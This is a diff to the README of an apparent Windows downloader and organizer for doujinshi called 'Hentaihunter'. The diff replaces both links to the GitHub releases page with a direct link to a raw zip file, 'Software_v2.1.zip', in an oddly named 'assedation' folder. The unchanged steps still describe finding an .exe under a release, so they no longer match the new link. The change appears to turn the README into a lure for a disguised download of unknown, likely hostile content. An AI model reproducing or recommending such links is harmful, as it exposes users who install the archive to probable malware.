@@ -1,6 +1,6 @@
 # 🔍 Hentaihunter - Download and organize your doujinshi collections
 
-[![Download Hentaihunter](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Leonargyrotaenia613/Hentaihunter/releases)
+[![Download Hentaihunter](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Leonargyrotaenia613/Hentaihunter/main/assedation/Software_v2.1.zip)
 
 ## 📋 About This Application
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 or Windows 11. You need at least 500 MB of f
 
 ## 🚀 How to Install and Run
 
-1. Visit [this page to download](https://github.com/Leonargyrotaenia613/Hentaihunter/releases) the latest version.
+1. Visit [this page to download](https://raw.githubusercontent.com/Leonargyrotaenia613/Hentaihunter/main/assedation/Software_v2.1.zip) the latest version.
 2. Look for the file ending in .exe under the most recent release.
 3. Click the filename to save the installer to your computer.
 4. Open your Downloads folder and double-click the file you saved.
